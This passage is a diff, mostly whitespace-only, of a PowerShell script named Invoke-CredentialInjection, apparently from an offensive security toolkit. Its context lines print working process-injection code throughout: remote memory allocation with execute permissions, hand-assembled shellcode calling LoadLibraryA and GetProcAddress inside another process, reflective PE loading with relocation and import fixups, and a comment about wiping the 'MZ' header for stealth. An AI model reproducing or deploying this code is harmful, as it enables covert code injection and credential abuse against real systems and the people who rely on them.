 		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
 	    }
-	
-	
+
+
 	    Function Invoke-CreateRemoteThread
 	    {
 		    Param(
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [IntPtr]
 		    $ProcessHandle,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [IntPtr]
 		    $StartAddress,
-		
+
 		    [Parameter(Position = 3, Mandatory = $false)]
 		    [IntPtr]
 		    $ArgumentPtr = [IntPtr]::Zero,
-		
+
 		    [Parameter(Position = 4, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions
 		    )
-		
+
 		    [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
-		
+
 		    $OSVersion = [Environment]::OSVersion.Version
 		    #Vista and Win7
 		    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
@@ -1243,16 +1243,16 @@ function Invoke-CredentialInjection
 			    Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
 			    $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
 		    }
-		
+
 		    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
 		    {
 			    Write-Verbose "Error creating remote thread, thread handle is null"
 		    }
-		
+
 		    return $RemoteThreadHandle
 	    }
 
-	
+
 
 	    Function Get-ImageNtHeaders
 	    {
@@ -1260,14 +1260,14 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [IntPtr]
 		    $PEHandle,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types
 		    )
-		
+
 		    $NtHeadersInfo = New-Object System.Object
-		
+
 		    #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
 		    $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
 
@@ -1275,13 +1275,13 @@ function Invoke-CredentialInjection
 		    [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
 		    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
 		    $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
-		
+
 		    #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
 	        if ($imageNtHeaders64.Signature -ne 0x00004550)
 	        {
 	            throw "Invalid IMAGE_NT_HEADER signature."
 	        }
-		
+
 		    if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
 		    {
 			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
@@ -1293,7 +1293,7 @@ function Invoke-CredentialInjection
 			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
 			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
 		    }
-		
+
 		    return $NtHeadersInfo
 	    }
 
@@ -1305,31 +1305,31 @@ function Invoke-CredentialInjection
 		    [Parameter( Position = 0, Mandatory = $true )]
 		    [Byte[]]
 		    $PEBytes,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types
 		    )
-		
+
 		    $PEInfo = New-Object System.Object
-		
+
 		    #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
 		    [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
 		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
-		
+
 		    #Get NtHeadersInfo
 		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
-		
+
 		    #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
-		
+
 		    #Free the memory allocated above, this isn't where we allocate the PE to memory
 		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
-		
+
 		    return $PEInfo
 	    }
 
@@ -1342,33 +1342,33 @@ function Invoke-CredentialInjection
 		    [Parameter( Position = 0, Mandatory = $true)]
 		    [IntPtr]
 		    $PEHandle,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants
 		    )
-		
+
 		    if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
 		    {
 			    throw 'PEHandle is null or IntPtr.Zero'
 		    }
-		
+
 		    $PEInfo = New-Object System.Object
-		
+
 		    #Get NtHeaders information
 		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
-		
+
 		    #Build the PEInfo object
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
 		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
-		
+
 		    if ($PEInfo.PE64Bit -eq $true)
 		    {
 			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
@@ -1379,7 +1379,7 @@ function Invoke-CredentialInjection
 			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
 			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
 		    }
-		
+
 		    if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
 		    {
 			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
@@ -1392,25 +1392,25 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "PE file is not an EXE or DLL"
 		    }
-		
+
 		    return $PEInfo
 	    }
-	
-	
+
+
 	    Function Import-DllInRemoteProcess
 	    {
 		    Param(
 		    [Parameter(Position=0, Mandatory=$true)]
 		    [IntPtr]
 		    $RemoteProcHandle,
-		
+
 		    [Parameter(Position=1, Mandatory=$true)]
 		    [IntPtr]
 		    $ImportDllPathPtr
 		    )
-		
+
 		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-		
+
 		    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
 		    $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
 		    $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
@@ -1421,7 +1421,7 @@ function Invoke-CredentialInjection
 
 		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
 		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
-		
+
 		    if ($Success -eq $false)
 		    {
 			    Throw "Unable to write DLL path to remote process memory"
@@ -1430,10 +1430,10 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
 		    }
-		
+
 		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
 		    $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
-		
+
 		    [IntPtr]$DllAddress = [IntPtr]::Zero
 		    #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
 		    #	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
@@ -1445,18 +1445,18 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
 			    }
-			
-			
+
+
 			    #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
 			    $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
 			    $LoadLibrarySC2 = @(0x48, 0xba)
 			    $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
 			    $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
-			
+
 			    $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
 			    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
 			    $SCPSMemOriginal = $SCPSMem
-			
+
 			    Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
 			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
 			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
@@ -1472,26 +1472,26 @@ function Invoke-CredentialInjection
 			    Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
 			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
 
-			
+
 			    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			    if ($RSCAddr -eq [IntPtr]::Zero)
 			    {
 				    Throw "Unable to allocate memory in the remote process for shellcode"
 			    }
-			
+
 			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 			    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 			    {
 				    Throw "Unable to write shellcode to remote process memory."
 			    }
-			
+
 			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			    if ($Result -ne 0)
 			    {
 				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 			    }
-			
+
 			    #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
 			    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 			    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
@@ -1512,34 +1512,34 @@ function Invoke-CredentialInjection
 			    {
 				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 			    }
-			
+
 			    [Int32]$ExitCode = 0
 			    $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
 			    if (($Result -eq 0) -or ($ExitCode -eq 0))
 			    {
 				    Throw "Call to GetExitCodeThread failed"
 			    }
-			
+
 			    [IntPtr]$DllAddress = [IntPtr]$ExitCode
 		    }
-		
+
 		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
-		
+
 		    return $DllAddress
 	    }
-	
-	
+
+
 	    Function Get-RemoteProcAddress
 	    {
 		    Param(
 		    [Parameter(Position=0, Mandatory=$true)]
 		    [IntPtr]
 		    $RemoteProcHandle,
-		
+
 		    [Parameter(Position=1, Mandatory=$true)]
 		    [IntPtr]
 		    $RemoteDllHandle,
-		
+
 		    [Parameter(Position=2, Mandatory=$true)]
 		    [String]
 		    $FunctionName
@@ -1547,7 +1547,7 @@ function Invoke-CredentialInjection
 
 		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		    $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
-		
+
 		    #Write FunctionName to memory (will be used in GetProcAddress)
 		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
 		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
@@ -1567,20 +1567,20 @@ function Invoke-CredentialInjection
 		    {
 			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
 		    }
-		
+
 		    #Get address of GetProcAddress
 		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
 		    $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes
 
-		
+
 		    #Allocate memory for the address returned by GetProcAddress
 		    $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		    if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
 		    {
 			    Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
 		    }
-		
-		
+
+
 		    #Write Shellcode to the remote process which will call GetProcAddress
 		    #Shellcode: GetProcAddress.asm
 		    #todo: need to have detection for when to get by ordinal
@@ -1604,7 +1604,7 @@ function Invoke-CredentialInjection
 		    $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
 		    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
 		    $SCPSMemOriginal = $SCPSMem
-		
+
 		    Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
 		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
 		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
@@ -1623,26 +1623,26 @@ function Invoke-CredentialInjection
 		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
 		    Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
 		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
-		
+
 		    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 		    if ($RSCAddr -eq [IntPtr]::Zero)
 		    {
 			    Throw "Unable to allocate memory in the remote process for shellcode"
 		    }
-		
+
 		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 		    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 		    {
 			    Throw "Unable to write shellcode to remote process memory."
 		    }
-		
+
 		    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 		    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		    if ($Result -ne 0)
 		    {
 			    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 		    }
-		
+
 		    #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
 		    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 		    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
@@ -1655,7 +1655,7 @@ function Invoke-CredentialInjection
 		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
-		
+
 		    return $ProcAddress
 	    }
 
@@ -1666,28 +1666,28 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [Byte[]]
 		    $PEBytes,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types
 		    )
-		
+
 		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		    {
 			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
 			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
-		
+
 			    #Address to copy the section to
 			    [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
-			
+
 			    #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
 			    #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
 			    #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
@@ -1698,18 +1698,18 @@ function Invoke-CredentialInjection
 			    {
 				    $SizeOfRawData = 0
 			    }
-			
+
 			    if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
 			    {
 				    $SizeOfRawData = $SectionHeader.VirtualSize
 			    }
-			
+
 			    if ($SizeOfRawData -gt 0)
 			    {
 				    Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
 				    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
 			    }
-		
+
 			    #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
 			    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
 			    {
@@ -1728,24 +1728,24 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [Int64]
 		    $OriginalImageBase,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types
 		    )
-		
+
 		    [Int64]$BaseDifference = 0
 		    $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
 		    [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
-		
+
 		    #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
 		    if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
 				    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
@@ -1763,7 +1763,7 @@ function Invoke-CredentialInjection
 		    {
 			    $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
 		    }
-		
+
 		    #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
 		    [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
 		    while($true)
@@ -1799,11 +1799,11 @@ function Invoke-CredentialInjection
 				    #	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
 				    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
 						    -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
-				    {			
+				    {
 					    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
 					    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
 					    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
-		
+
 					    if ($AddDifference -eq $true)
 					    {
 						    [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
@@ -1811,7 +1811,7 @@ function Invoke-CredentialInjection
 					    else
 					    {
 						    [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
-					    }				
+					    }
 
 					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
 				    }
@@ -1821,7 +1821,7 @@ function Invoke-CredentialInjection
 					    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
 				    }
 			    }
-			
+
 			    $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
 		    }
 	    }
@@ -1833,38 +1833,38 @@ function Invoke-CredentialInjection
 		    [Parameter(Position = 0, Mandatory = $true)]
 		    [System.Object]
 		    $PEInfo,
-		
+
 		    [Parameter(Position = 1, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Functions,
-		
+
 		    [Parameter(Position = 2, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Types,
-		
+
 		    [Parameter(Position = 3, Mandatory = $true)]
 		    [System.Object]
 		    $Win32Constants,
-		
+
 		    [Parameter(Position = 4, Mandatory = $false)]
 		    [IntPtr]
 		    $RemoteProcHandle
 		    )
-		
+
 		    $RemoteLoading = $false
 		    if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
 		    {
 			    $RemoteLoading = $true
 		    }
-		
+
 		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
 		    {
 			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
-			
+
 			    while ($true)
 			    {
 				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
-				
+
 				    #If the structure is null, it signals that this is the end of the array
 				    if ($ImportDescriptor.Characteristics -eq 0 `
 						    -and $ImportDescriptor.FirstThunk -eq 0 `
@@ -1879,7 +1879,7 @@ function Invoke-CredentialInjection
 				    $ImportDllHandle = [IntPtr]::Zero
 				    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
 				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
-				
+
 				    if ($RemoteLoading -eq $true)
 				    {
 					    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
@@ -1893,12 +1893,12 @@ function Invoke-CredentialInjection
 				    {
 					    throw "Error importing DLL, DLLName: $ImportDllPath"
 				    }
-				
+
 				    #Get the first thunk, then loop through all of them
 				    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
 				    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
 				    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
-				
+
 				    while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
 				    {
 					    $ProcedureName = ''
@@ -1916,7 +1916,7 @@ function Invoke-CredentialInjection
 						    $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
 						    $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
 					    }
-					
+
 					    if ($RemoteLoading -eq $true)
 					    {
 						    [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
@@ -1925,19 +1925,19 @@ function Invoke-CredentialInjection
 					    {
 						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
 					    }
-					
+
 					    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
 					    {
 						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
 					    }
 
 					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
-					
+
 					    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
 					    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
 					    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
 				    }
-				
+
 				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
 			    }
 		    }
@@ -1950,7 +1950,7 @@ function Invoke-CredentialInjection
 		    [UInt32]
 		    $SectionCharacteristics
 		    )
-		
+
 		    $ProtectionFlag = 0x0
 		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
 		    {
@@ -2002,12 +2002,12 @@ function Invoke-CredentialInjection
 				    }
 			    }
 		    }
-		
+
 		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
 		    {
 			    $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
 		    }
-		
+
 		    return $ProtectionFlag
 	    }
 
